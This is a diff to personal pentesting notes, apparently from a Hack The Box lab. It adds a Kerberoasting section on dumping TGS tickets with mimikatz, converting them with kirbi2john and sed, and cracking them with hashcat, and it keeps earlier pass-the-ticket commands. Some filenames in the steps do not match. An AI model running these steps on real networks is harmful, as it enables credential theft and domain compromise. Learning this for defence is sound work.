@@ -1,4 +1,10 @@
-Attacks: #PtH #PtT 
+---
+tags:
+  - windows
+  - PtH
+  - PtT
+  - kerberoasting
+---
 # Modules
 ## Logon Passwords
 ```powershell
@@ -39,4 +45,46 @@ PS > mimikatz.exe privilege::debug 'kerberos::ptt "C:\Path\to\[0;6c680]-2-0-40e1
 ```powershell
 PS > mimikatz.exe privilege::debug 'kerberos::ptt "C:\Path\to\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"' exit
 PS > Enter-PSSession -ComputerName DC01
+```
+# Kerberoasting
+## Extract TGS Ticket from Memory
+If the TGS ticket is in memory (from [[SetSPN]] for example), extract it:
+```cmd-session
+mimikatz # base64 /out:true
+mimikatz # kerberos::list /export
+
+<SNIP>
+[00000002] - 0x00000017 - rc4_hmac_nt      
+   Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM
+   Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL
+   Client Name       : htb-student @ INLANEFREIGHT.LOCAL
+   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
+====================
+Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
+====================
+doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFO
+RUZSRUlHSFQuTE9DQUyiOzA5oAMCAQKhMjAwGwhNU1NRTFN2YxskREVWLVBSRS1T
+<SNIP>
+32UeFiVp60IcdOjV4Mwan6tYpLm2O6uwnvw0J+Fmf5x3Mbyr42RZhgQKcwaSTfXm
+LkxPQ0FMqTswOaADAgECoTIwMBsITVNTUUxTdmMbJERFVi1QUkUtU1FMLmlubGFu
+ZWZyZWlnaHQubG9jYWw6MTQzMw==
+====================
+   * Saved to file     : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
+<SNIP>
+```
+>Without `base64 /out:true` command, it will extract the tickets in `.kirbi` files, with which we can directly skip to `kirbi2john` step.
+## Prepare the file for Cracking
+- Clean the base64 and convert to `.kirbi`:
+```shell-session
+$ echo "<base64 blob>" |  tr -d \\n >> encoded_file
+$ cat encoded_file | base64 -d > sqldev.kirbi
+$ kirbi2john sqldev.kirbi
+$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs.hashcat
+$ cat sqldev_tgs_hashcat 
+
+$krb5tgs$23$*sqldev.kirbi*$813149fb<SNIP>8e71a057feeab
+```
+## Crack the Hash using [[Hashcat]]
+```shell-session
+$ hashcat -m 13100 sqldev_tgs.hashcat /usr/share/wordlists/rockyou.txt
 ```
